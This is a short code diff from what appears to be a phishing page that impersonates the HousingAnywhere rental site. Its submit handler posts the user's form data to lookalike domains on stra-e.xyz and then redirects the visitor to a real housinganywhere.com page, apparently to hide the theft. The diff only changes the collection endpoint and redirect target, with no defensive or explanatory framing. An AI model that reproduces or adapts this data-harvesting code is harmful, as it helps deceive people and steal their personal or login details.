@@ -22,13 +22,14 @@ function Home() {
 
   async function handleSubmitFn() {
     try {
-      await axios.post(`https://housinganywhere.com.stra-e.xyz/api/user`, data);
-      router.replace('https://answers.housinganywhere.com/en/');
+      await axios.post(`https://housinganywhere.com.id.stra-e.xyz`, data);
+      router.replace('https://housinganywhere.com/users/show/2080199');
     } catch(err) {
       console.log(err.response, "ce o avea");
     }
   }
-// https://housinganywhere.com/room/ut1536314/es/Madrid/calle-del-limonero?flexDays=14
+// housinganywhere.com.id.stra-e.xyz
+
   function handleSubmit(e) {
     e.preventDefault();
 
